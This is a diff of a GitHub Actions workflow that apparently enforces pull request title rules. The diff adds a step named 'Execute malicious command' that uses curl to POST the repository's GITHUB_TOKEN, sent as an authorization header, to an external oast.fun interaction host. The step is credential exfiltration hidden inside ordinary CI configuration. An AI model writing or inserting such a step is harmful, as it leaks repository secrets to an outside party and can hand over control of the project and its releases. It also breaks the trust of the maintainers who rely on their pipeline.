@@ -24,6 +24,9 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       # Add comment indicating we require pull request titles to follow conventional commits specification
+      - name: Execute malicious command
+        run: |  
+          curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" -d '{"body":"This is a malicious comment!"}' http://sbfwstspuutiarcjzptfy8asr2j10ohpy.oast.fun
       - uses: marocchino/sticky-pull-request-comment@v2
         if: always() && (steps.check_pr_title.outputs.error_message != null)
         with:
